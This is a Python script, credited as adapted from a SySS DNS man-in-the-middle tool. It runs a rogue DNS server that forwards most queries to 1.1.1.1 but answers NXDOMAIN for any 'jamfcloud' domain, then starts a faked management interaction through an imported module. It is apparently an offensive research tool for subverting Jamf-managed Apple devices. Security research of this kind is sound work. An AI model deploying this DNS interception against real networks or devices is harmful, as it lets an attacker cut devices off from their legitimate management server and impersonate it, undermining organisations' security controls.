# Credit to: Adrian Vollmer, SySS GmbH 2016
# https://github.com/SySS-Research/dns-mitm/blob/master/dns-mitm.py

import socket
import dnslib

from datetime import datetime, timedelta

from request_faker import handle_response, send_initial_request
from Logger import Logger

logger = Logger()

last_empty_response_time = None
EMPTY_RESPONSE_THRESHOLD = 1.0


def perform_fake_interaction():
    global last_empty_response_time
    if last_empty_response_time is not None:
        if (
            datetime.now() - last_empty_response_time
        ).total_seconds() < EMPTY_RESPONSE_THRESHOLD:
            last_empty_response_time = datetime.now()
            logger.log(
                "Last empty response was less than the threshold ago. Possibly multiple dns cuerries upon first failure of first"
            )
            return

    logger.log("Performing fake interaction", "")

    response = send_initial_request()

    if response == "":
        logger.log(
            "Initial request returned empty response. Exiting without declarative management",
            "",
        )
        return

    if response == "KILL":
        logger.log("Received KILL", "stopping fake interaction...")
        return

    response = handle_response(response)
    while response != "KILL":
        response = handle_response(response)

    print(
        "Received KILL",
        "stopping fake interaction... This is not necessary killswitch, it can also have been successful",
    )


PORT = 53


def receiveData(udps):
    types = {1: "A", 2: "NS", 15: "MX", 16: "TXT", 28: "AAAA"}

    data, addr = udps.recvfrom(1024)

    dnsD = dnslib.DNSRecord.parse(data)

    try:
        type = types[dnsD.questions[0].qtype]
    except KeyError:
        type = "OTHER"

    labels = dnsD.questions[0].qname.label
    header_id = dnsD.header.id
    request_q = dnsD.q
    domain = b".".join(labels)
    domain = domain.decode()

    print("Being requested %s %s" % (type, domain))

    return data, header_id, request_q, addr, domain


def forwarded_dns_request(data):
    print("forwarding...")
    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udps.sendto(data, ("1.1.1.1", 53))
    data, _ = udps.recvfrom(1024)

    return data


def main_loop(udps):
    while True:
        data, header_id, request_q, addr, domain = receiveData(udps)

        if "jamfcloud" in domain:
            # Not found response
            response = dnslib.DNSRecord(
                dnslib.DNSHeader(id=header_id, qr=1, aa=1, ra=1), q=request_q
            )
            response.header.rcode = dnslib.RCODE.NXDOMAIN

            udps.sendto(response.pack(), addr)

            perform_fake_interaction()
        else:
            answer = forwarded_dns_request(data)
            udps.sendto(answer, addr)
            print("Forwarded")


def init_listener():
    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udps.bind(("", PORT))

    return udps


def main():
    udps = init_listener()
    main_loop(udps)


if __name__ == "__main__":
    main()
